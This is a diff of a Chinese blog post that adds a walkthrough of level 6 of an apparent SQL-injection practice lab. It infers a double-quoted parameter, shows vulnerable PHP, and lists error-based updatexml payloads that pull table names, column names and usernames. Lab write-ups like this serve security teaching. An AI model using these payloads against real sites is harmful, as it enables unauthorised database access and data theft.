@@ -239,7 +239,26 @@
 <p>读取一下username的数据，注入?id&#x3D;-1’ AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1) –+。</p>
 <p>之后只要一个一个更改0,1前面的0，就可以读取到所有信息了。</p>
 <hr>
-<h2 id="6"><a href="#6" class="headerlink" title="#6"></a>#6</h2><hr>
+<h2 id="6："><a href="#6：" class="headerlink" title="#6："></a>#6：</h2><p><img src="/images/QQ20251227-214303.png" alt="alt text"></p>
+<p>简单的测试后，发现所有的正常注入都是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in...........</span><br></pre></td></tr></table></figure>
+
+<p>这样的回显，说明正常注入的回显是固定的，所有我们只能采用报错注入。</p>
+<p>经过几次测试后，发现这次的报错注入的id处应该是加了双引号，类似这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&quot;id&quot;];</span><br><span class="line">$sql = &quot;SELECT username FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">    echo &quot;XPATH syntax error: &quot; . mysql_error();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接注入id&#x3D;-1” AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那看来就是一样的操作了。</p>
+<p>具体回显就不再贴出，仅展示对应作用的注入内容。</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1), 0x7e), 1) (查表)</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1), 0x7e), 1) –+ (查内容)</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1) –+ (查数据)</p>
+<p>其实就是上一题的单引号改成双引号。</p>
+<hr>
+<h2 id="7："><a href="#7：" class="headerlink" title="#7："></a>#7：</h2><hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -248,6 +267,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1766842042766"></script>
+<script src="/js/main.js?v=1766843465949"></script>
 </body>
 </html>
